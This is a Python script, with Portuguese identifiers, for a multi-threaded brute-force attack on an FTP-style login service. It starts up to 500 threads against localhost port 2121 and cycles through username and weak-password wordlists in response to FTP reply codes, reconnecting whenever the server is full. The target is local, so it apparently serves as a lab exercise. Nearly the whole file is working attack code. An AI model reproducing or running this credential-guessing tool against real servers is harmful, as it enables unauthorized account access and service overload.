import socket
import time
import threading


class Enxame_de_drones_invasores:
    def __init__(self):
        self.host='localhost'
        self.porta=2121
        self.numero_de_agentes=1
        self.maximo_de_agentes=500
        self.lista_de_nomes=[]
        self.lista_de_senhas=[]
        
        #re-escreve o arquivo de texto com base no usuario e senha usada
        with open('nomes_de_conta_servidor.txt','r') as f:
            for nome in f:
                self.lista_de_nomes.append(nome.strip())
        with open('senhas_fracas_servidor.txt','r') as f:
            for senha in f:
                self.lista_de_senhas.append(senha.strip())

    #cria o socket reserva para se conectar após uma conexão ser liberada
    def drone_esperando(self, socket_invasor):
        socket_invasor.close()
        invasor_esperando = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('servidor lotado. Esperando liberar...')
        time.sleep(2)

        #Loop de logica dos robos que estão esperando
        while True:
            try:
                invasor_esperando.connect((self.host, self.porta))
                socket_invasor = invasor_esperando
                break
            except:
                time.sleep(2)
        return invasor_esperando


    #Loop principal dos robos
    def drone_individual(self):
        index_nomes_atual = 0
        index_senha_atual = 0
        socket_invasor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_invasor.connect((self.host, self.porta))

        while index_senha_atual != len(self.lista_de_senhas):
            try:
                mensagem_recebida = socket_invasor.recv(1024).decode()
            except:
                socket_invasor = self.drone_esperando(socket_invasor)
                continue

            if mensagem_recebida.startswith('220'):
                socket_invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
                print(f'Enviado usuario {self.lista_de_nomes[index_nomes_atual]}')
                index_nomes_atual += 1

            elif mensagem_recebida.startswith('331'):
                socket_invasor.send((f'pass {self.lista_de_senhas[index_senha_atual]}').encode())
                print(f'Enviado senha {self.lista_de_senhas[index_senha_atual]}')
                index_senha_atual += 1

            elif mensagem_recebida.startswith('530'):
                socket_invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
                print(f'Enviado usuario {self.lista_de_senhas[index_senha_atual]}')
                index_nomes_atual += 1

            else:
                socket_invasor = self.drone_esperando(socket_invasor)

            #time.sleep(0.2)

        print(socket_invasor.recv(1024).decode())
        socket_invasor.send(('quit').encode())
        print('Todos os agentes terminaram. ')

    def replicar_agentes(self):
        while self.numero_de_agentes != self.maximo_de_agentes:
            agente = threading.Thread(target=self.drone_individual)
            agente.start()
            print('conexão iniciada.')
            self.numero_de_agentes += 1
            time.sleep(0.2)


iniciar_ataque = Enxame_de_drones_invasores()
iniciar_ataque.replicar_agentes()